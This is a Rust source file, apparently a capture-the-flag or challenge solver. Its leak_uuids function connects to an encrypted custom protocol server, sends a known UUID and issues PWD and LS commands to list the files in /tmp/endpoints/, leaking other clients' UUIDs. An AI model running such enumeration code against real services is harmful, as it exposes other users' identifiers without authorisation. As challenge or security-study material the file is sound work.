use crate::shared;
use anyhow::Result;

#[allow(dead_code)]
pub fn leak_uuids() -> Result<()> {
    let (cipher, mut stream) = shared::connect()?;

    let uuid_param = format!("{}{}{}", shared::PARAM_UUID, shared::UUID_LEN, shared::UUID);
    let dir = hex::encode("/tmp/endpoints/".as_bytes());
    let dir_len = hex::encode(&(dir.len() / 2).to_be_bytes()[6..]);
    let ls_params = format!("{}{}{}{}", uuid_param, shared::PARAM_DIRNAME, dir_len, dir);

    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_INIT, &uuid_param)?;
    shared::send_cmd(&cipher, &mut stream, "0000", "")?; // cmd doesnt exist (resp code 22)
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_UNKNOWN1, "")?; // cmd unknown (resp code 33)
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_PWD, &uuid_param)?;
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_LS, &ls_params)?;
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_UPLOAD, &uuid_param)?; // params missing (resp code 44)
    shared::send_cmd(&cipher, &mut stream, shared::COMMAND_FIN, "")?;

    let responses = shared::get_responses(&cipher, &mut stream)?;

    let pwd_body = shared::get_message_body(&responses[3]);
    println!("pwd: {}", String::from_utf8_lossy(pwd_body));

    let ls_body =
        String::from_utf8_lossy(shared::get_message_body(&responses[4])).replace(',', "\n");
    println!("ls:\n{}", ls_body);

    Ok(())
}
